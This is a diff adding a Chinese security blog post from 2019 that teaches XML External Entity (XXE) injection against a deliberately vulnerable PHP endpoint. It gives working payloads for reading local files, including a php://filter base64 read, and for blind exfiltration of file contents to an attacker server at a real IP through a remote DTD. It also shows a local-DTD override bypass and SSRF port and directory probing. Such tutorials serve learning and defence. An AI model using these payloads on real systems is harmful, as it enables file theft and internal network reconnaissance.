@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>简单聊聊XXE漏洞原理及利用 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">zhhhy&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">zhhhy&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#首先什么是XXE-？"><span class="toc-text">首先什么是XXE ？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XML？"><span class="toc-text">什么是XML？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是XML外部实体？"><span class="toc-text">什么是XML外部实体？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML外部实体注入是如何产生的？"><span class="toc-text">XML外部实体注入是如何产生的？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#由浅入深理解XXE的利用方式"><span class="toc-text">由浅入深理解XXE的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#有回显的XXE"><span class="toc-text">有回显的XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无回显的XXE"><span class="toc-text">无回显的XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果无法访问外部的DTD文件怎么办？"><span class="toc-text">如果无法访问外部的DTD文件怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XEE内网探测"><span class="toc-text">XEE内网探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE目录扫描"><span class="toc-text">XXE目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在后面"><span class="toc-text">写在后面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">简单聊聊XXE漏洞原理及利用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 22, 2019&nbsp;&nbsp;21:26:42</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>一个问题要是能够讲明白，就得先有自己的理解。如果能教会别人，说明自己也理解的还算透彻。</p>
+<h2 id="首先什么是XXE-？"><a href="#首先什么是XXE-？" class="headerlink" title="首先什么是XXE ？"></a>首先什么是XXE ？</h2><p>​        <strong>XXE</strong>漏洞全程为<strong>XML External Entity Injection</strong>，也就是<strong>XML外部实体注入</strong>漏洞。<br>​        显然，这个漏洞和<strong>XML</strong>有关（废话），那第一步，先了解什么是<strong>XML</strong>。</p>
+<h3 id="什么是XML？"><a href="#什么是XML？" class="headerlink" title="什么是XML？"></a>什么是XML？</h3><p>百度百科</p>
+<blockquote>
+<p>可扩展<a href="https://baike.baidu.com/item/标记语言" target="_blank" rel="noopener">标记语言</a>，<a href="https://baike.baidu.com/item/标准通用标记语言/6805073" target="_blank" rel="noopener">标准通用标记语言</a>的子集，是一种用于标记电子文件使其具有结构性的<a href="https://baike.baidu.com/item/标记语言/5964436" target="_blank" rel="noopener">标记语言</a>。</p>
+</blockquote>
+<p>​        简单来说，它是一种语言，表现形式类似于<strong>HTML(超文本标记语言)</strong>，而<strong>XML</strong>与<strong>HTML</strong>的差别在于，<strong>HMTL</strong>是用于展示数据和页面，而<strong>XML</strong>是为了更好的存储和传输数据。HTML的容错能力使得格式可以不必十分规范，例如有时可能忘记闭合标签了也不会出错。而<strong>XML</strong>语法就严格很多。XML的语法可以参见<a href="https://www.runoob.com/xml/xml-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a>简单了解即可。</p>
+<h3 id="什么是XML外部实体？"><a href="#什么是XML外部实体？" class="headerlink" title="什么是XML外部实体？"></a>什么是XML外部实体？</h3><p>​        在<strong>XML</strong>中<strong>DTD</strong>（文档类型定义）的作用是定义 <strong>XML</strong> 文档的合法构建模块。<strong>DTD</strong>文件对当前XML文档中的节点进行了定义，这样我们加载配置文件之前，可通过指定的<strong>DTD</strong>对当前<strong>XML</strong>中的节点进行检查，确定XML结构和数据类型是否合法。如下代码，文档类型定义部分，规定了文档元素里的数据类型，以及可以出现哪些元素。<a href="https://www.runoob.com/dtd/dtd-tutorial.html" target="_blank" rel="noopener">DTD菜鸟教程</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [  　　&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;  PCDATA为字符串类型字符串</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt; </span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        而在<strong>DTD</strong>中，有两种类型的实体，内部实体和外部实体。<br>​        内部实体声明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class="line">实例：</span><br><span class="line">DTD :</span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line">XML ：</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br><span class="line">注：一个实体 由三部分组成，一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br></pre></td></tr></table></figure>
+
+<pre><code>外部实体声明：</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">实例：</span><br><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line"># 个人的理解是将 http://www.runoob.com/entities.dtd 的dtd 文件包含进当前文件里，类似于php的文件包含</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br><span class="line">注：一个实体 由三部分组成，一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br></pre></td></tr></table></figure>
+
+<p>从上述的例子，可以看出，<strong>外部实体</strong>是可以访问外部<strong>dtd</strong>文件的，而外部实体注入攻击正是利用了这一点。</p>
+<h3 id="XML外部实体注入是如何产生的？"><a href="#XML外部实体注入是如何产生的？" class="headerlink" title="XML外部实体注入是如何产生的？"></a>XML外部实体注入是如何产生的？</h3><p>上文已经介绍了，什么是<strong>XML</strong>和<strong>外部实体</strong>。那么是如何产生危害的呢？<strong>WEB</strong>漏洞的成因大多都是因为对用户的输入不够严格而导致的。<strong>XML</strong>是一种代码注入漏洞，因此要了解<strong>XML</strong>的语法才能理解漏洞的成因。看如下代码，先简单了解<strong>XXE</strong>的一个流程。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"># 目标网站存在功能代码，可以解析xml字符串。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># xml参数未进行过滤直接进行xml解析</span><br><span class="line"></span><br><span class="line">​	$xml=simplexml_load_string($_POST[&apos;xml&apos;]);</span><br><span class="line">​	#输出解析的结果</span><br><span class="line">​	print_r($xml);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">#以POST方式传入如下字符</span><br><span class="line">#由于进行XML解析,DTD代码开始执行，在此处开始访问攻击者的服务器上的payload文件。</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE catalog[</span><br><span class="line">   &lt;!ENTITY % data SYSTEM &quot;http://115.159.35.88/a.dtd&quot;&gt;</span><br><span class="line">%data;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=&quot;test101&quot;&gt;</span><br><span class="line">      &lt;author&gt;John, Doe&lt;/author&gt;</span><br><span class="line">      &lt;title&gt;I love XML&lt;/title&gt;</span><br><span class="line">      &lt;category&gt;Computers&lt;/category&gt;</span><br><span class="line">      &lt;price&gt;9.99&lt;/price&gt;</span><br><span class="line">      &lt;date&gt;2018-10-01&lt;/date&gt;</span><br><span class="line">      &lt;description&gt;&amp;b;&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">        &lt;!ENTITY % d SYSTEM &quot;http://115.159.35.88/a.dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&amp;b;&lt;/abc&gt;</span><br><span class="line"></span><br><span class="line"># 攻击者服务器上的 payload文件。 首先读取etc/passwd文件 并且给参数file。         </span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C://test/flag.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line"># 此处有个嵌套，既然是嵌套，先从最里层开始看。</span><br><span class="line"></span><br><span class="line"> #在上一句DTD代码中会声明出一个file参数，而这个参数的值是/etc/passwd的内容</span><br><span class="line"></span><br><span class="line"># 然后在此处被引用，发起一次get请求到攻击者的服务器，该请求拼接上了file的值</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://115.159.35.88/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line"># 引用all参数，为了得到send变量。</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<h2 id="由浅入深理解XXE的利用方式"><a href="#由浅入深理解XXE的利用方式" class="headerlink" title="由浅入深理解XXE的利用方式"></a>由浅入深理解XXE的利用方式</h2><p>​        到此，已经了解了什么是XML，什么是DTD，以及一个XXE的基本流程是什么样的。由于是一种代码注入，必然需要去了解语法知识，理解payload的构造方式。</p>
+<h3 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h3><p>在本地里建立一个flag.txt看看效果。</p>
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C1.png" alt></p>
+<p>xxe.php内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment"># xml参数未进行过滤直接进行xml解析</span></span><br><span class="line">	$xml=simplexml_load_string($_POST[<span class="string">'xml'</span>]);</span><br><span class="line">	<span class="comment">#输出解析的结果</span></span><br><span class="line">	print_r($xml);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload发送。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;file:///C://test/flag.txt&quot;&gt;</span><br><span class="line">   ]&gt;</span><br><span class="line">&lt;hack&gt;&amp;file;&lt;/hack&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C10.png" alt></p>
+<p>​        这个payload用于读取静态文件，而如果是PHP文件或者静态文件里包含的PHP代码是不会被读取出来的。那怎么办呢？ 文件包含中用到过的伪协议，在这里同样可以用。<strong>不局限于伪协议，不同语言的效果不同。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D://phpstudy/PHPTutorial/WWW/aaa.txt&quot;&gt;</span><br><span class="line">   ]&gt;</span><br><span class="line">&lt;hack&gt;&amp;file;&lt;/hack&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C6.png" alt></p>
+<h3 id="无回显的XXE"><a href="#无回显的XXE" class="headerlink" title="无回显的XXE"></a>无回显的XXE</h3><p>​        如果没有回显，我们如何获得外带出获得数据呢。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#首先，我们设置一个变量 %file 用来承接读取到的内容</span><br><span class="line">#接着，对我们的vps服务器发起一次get请求，并且拼接上数据去请求，不就可以外带数据了吗？</span><br><span class="line">#按照思路，我们可以构造如下语句，似乎没啥毛病？</span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE hack [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % file SYSTEM "file:///C://test/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY %send SYSTEM "http://115.159.35.88/?%file"&gt;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">   ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hack</span>&gt;</span>&amp;sender;<span class="tag">&lt;/<span class="name">hack</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#但是实际上上面语句是不正确的， 由于同级的参数不会被解析,所以不行。</span><br><span class="line">#所以考虑一下嵌套,于是构造如下语句，可是还是报错了。</span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE hack [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % file SYSTEM "file:///C://test/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % exp "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://115.159.35.88/?%file;'&gt;"&gt;</span></span><br><span class="line"><span class="meta">	%exp;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">   ]&gt;</span></span><br><span class="line"> #报错： Entity: line 1: parser error : PEReferences forbidden in internal subset </span><br><span class="line"> #在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错</span><br><span class="line"> # 也就是说 % file是参数实体引用不可以出现在exp元素声明的内部。</span><br><span class="line"> #于是将</span><br><span class="line">&lt;!ENTITY % exp "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://115.159.35.88/?%file;'&gt;"&gt;</span><br><span class="line">		  %exp;</span><br><span class="line">#写在可控的服务器上</span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE hack [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % get  SYSTEM "http://115.159.35.88/a.dtd"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % file SYSTEM "file:///C://test/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">	%get;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">   ]&gt;</span></span><br><span class="line"># 先引用了%get对象，发起请求，加载了a.dtd，而a.dtd中又引用了%exp，接在exp里声明了send，最最后send里有file。</span><br></pre></td></tr></table></figure>
+
+<p>​        可以看到服务器有两条记录，首先是先获取a.dtd，然后第二次又发起了一次请求，外带出了数据。</p>
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C5.png" alt></p>
+<h3 id="如果无法访问外部的DTD文件怎么办？"><a href="#如果无法访问外部的DTD文件怎么办？" class="headerlink" title="如果无法访问外部的DTD文件怎么办？"></a>如果无法访问外部的DTD文件怎么办？</h3><p>​        上述的方法，是远程加载了一个<strong>DTD</strong>文件。如此做的原因在于<strong>参数实体引用只能和元素同级而不能直接出现在元素内部</strong>。</p>
+<p>我们将如下语句写在了可控的服务器上，进行远程获取，这样就避免了这个问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % exp &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://115.159.35.88/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%exp;</span><br></pre></td></tr></table></figure>
+
+<p>​        同理，那么只要引入一个文件，不管是本地还是远程文件，目的是在于绕过上述限制。于是我们可以引用本地的<strong>dtd</strong>文件重写里面的<strong>DTD</strong>实体，即可达到和上述一样的效果 。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#/usr/share/yelp/dtd/docbookx.dtd 为Linux的一个文件。</span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % ISOamso '</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://myip/?&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;send;</span></span><br><span class="line"><span class="meta">    '&gt; </span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="XEE内网探测"><a href="#XEE内网探测" class="headerlink" title="XEE内网探测"></a>XEE内网探测</h3><p>从前面的例子可以看出来，在解析<strong>DTD</strong>文件的时候可以发起一次<strong>GET</strong>请求，而这个请求是有服务器发起的，那自然而然的可以想到<strong>SSRF</strong>相关的问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE hack [ 	</span><br><span class="line">&lt;!ENTITY % get  SYSTEM &quot;http://115.159.35.88:81&quot;&gt; </span><br><span class="line">%get; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C3.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE hack [ 	</span><br><span class="line">&lt;!ENTITY % get  SYSTEM &quot;http://115.159.35.88:80&quot;&gt; </span><br><span class="line">%get; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C11.png" alt="1563719823699"></p>
+<p>对比两个报错，可以发现，端口未开放就会有I/O错误。再看看22端口，是我开启用来ssh连接的端口。</p>
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C4.png" alt></p>
+<h3 id="XXE目录扫描"><a href="#XXE目录扫描" class="headerlink" title="XXE目录扫描"></a>XXE目录扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE hack [ 	</span><br><span class="line">&lt;!ENTITY % get  SYSTEM &quot;http://115.159.35.88:80/aab/&quot;&gt; </span><br><span class="line">%get; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;hack&gt;&amp;a;&lt;/hack&gt;</span><br></pre></td></tr></table></figure>
+
+<p>aab是不存在的目录，所以会爆404；</p>
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C7.png" alt></p>
+<p>aaa是存在的目录，所以是403</p>
+<p><img src="/2019/07/22/xxe-learn/xxe-learn%5C8.png" alt></p>
+<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>​        很可笑的是，<strong>XXE</strong>这个问题在18年的时候就写过一篇文章了，回过头来看竟然有些看不懂。重新理解了一遍<strong>XXE</strong>还是有所收获的。 回过头看以前的很多文章，大多都只是抄啊抄，已经忘了当时是一个怎么样的心态写下那些文章。也忘了是否真的理解了自己写的内容。不过好在现在比较求稳，一步一步跟着调试复现比对，不急于发表博客，可能这就是成长吧。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhhhy.github.io/2018/08/21/XXE/#参考链接" target="_blank" rel="noopener">https://zhhhy.github.io/2018/08/21/XXE/#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5</a></p>
+<p><a href="https://xz.aliyun.com/t/2571#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/2571#toc-10</a></p>
+<p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2019/07/22/xxe-learn/">http://yoursite.com/2019/07/22/xxe-learn/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2019/06/28/zzzcms/">ZZZCMS V1.7.1 漏洞合集</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
